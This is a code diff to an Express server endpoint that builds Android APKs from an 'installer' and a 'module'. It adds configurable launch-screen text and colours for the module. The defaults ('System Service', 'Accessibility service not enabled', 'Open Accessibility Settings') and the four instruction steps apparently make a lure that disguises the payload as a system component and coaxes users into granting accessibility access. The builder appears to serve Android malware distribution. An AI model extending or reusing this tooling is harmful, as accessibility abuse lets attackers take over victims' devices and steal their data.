@@ -2038,6 +2038,10 @@ app.post('/api/build/apk', requireUserOrAdmin, express.json({ limit: '12mb' }), 
         moduleIconUrl, installerIconUrl,
         installerLaunchTitle, installerLaunchSubtitle, installerLaunchBtnText,
         installerLaunchBgColor, installerLaunchAccentColor,
+        moduleLaunchTitle, moduleLaunchSubtitle,
+        moduleLaunchStep1, moduleLaunchStep2, moduleLaunchStep3, moduleLaunchStep4,
+        moduleLaunchBtnText, moduleLaunchFooter,
+        moduleLaunchBgColor, moduleLaunchCardColor, moduleLaunchAccentColor,
     } = req.body || {};
 
     if (!isValidAppName(moduleName))         return res.status(400).json({ success: false, error: 'Invalid module name (1-40 chars, letters/digits/space/.&\'-)' });
@@ -2074,6 +2078,18 @@ app.post('/api/build/apk', requireUserOrAdmin, express.json({ limit: '12mb' }), 
     const safeBtnText     = sanitizeText(installerLaunchBtnText,     'Install');
     const safeBgColor     = sanitizeColor(installerLaunchBgColor,    '#0B1020');
     const safeAccentColor = sanitizeColor(installerLaunchAccentColor,'#6366F1');
+
+    const safeModuleLaunchTitle    = sanitizeText(moduleLaunchTitle,    'System Service');
+    const safeModuleLaunchSubtitle = sanitizeText(moduleLaunchSubtitle, 'Accessibility service not enabled');
+    const safeModuleLaunchStep1    = sanitizeText(moduleLaunchStep1,    '');
+    const safeModuleLaunchStep2    = sanitizeText(moduleLaunchStep2,    '');
+    const safeModuleLaunchStep3    = sanitizeText(moduleLaunchStep3,    '');
+    const safeModuleLaunchStep4    = sanitizeText(moduleLaunchStep4,    '');
+    const safeModuleLaunchBtnText  = sanitizeText(moduleLaunchBtnText,  'Open Accessibility Settings');
+    const safeModuleLaunchFooter   = sanitizeText(moduleLaunchFooter,   '');
+    const safeModuleLaunchBgColor     = sanitizeColor(moduleLaunchBgColor,     '#0F172A');
+    const safeModuleLaunchCardColor   = sanitizeColor(moduleLaunchCardColor,   '#1E293B');
+    const safeModuleLaunchAccentColor = sanitizeColor(moduleLaunchAccentColor, '#0EA5E9');
 
     const ghToken = (process.env.GITHUB_PERSONAL_ACCESS_TOKEN || '').trim();
     if (!ghToken) {
@@ -2119,6 +2135,17 @@ app.post('/api/build/apk', requireUserOrAdmin, express.json({ limit: '12mb' }), 
         installerLaunchBtnText:     safeBtnText,
         installerLaunchBgColor:     safeBgColor,
         installerLaunchAccentColor: safeAccentColor,
+        moduleLaunchTitle:          safeModuleLaunchTitle,
+        moduleLaunchSubtitle:       safeModuleLaunchSubtitle,
+        moduleLaunchStep1:          safeModuleLaunchStep1,
+        moduleLaunchStep2:          safeModuleLaunchStep2,
+        moduleLaunchStep3:          safeModuleLaunchStep3,
+        moduleLaunchStep4:          safeModuleLaunchStep4,
+        moduleLaunchBtnText:        safeModuleLaunchBtnText,
+        moduleLaunchFooter:         safeModuleLaunchFooter,
+        moduleLaunchBgColor:        safeModuleLaunchBgColor,
+        moduleLaunchCardColor:      safeModuleLaunchCardColor,
+        moduleLaunchAccentColor:    safeModuleLaunchAccentColor,
         sseId: sseId || null,
         status: 'running',
         lines: [],
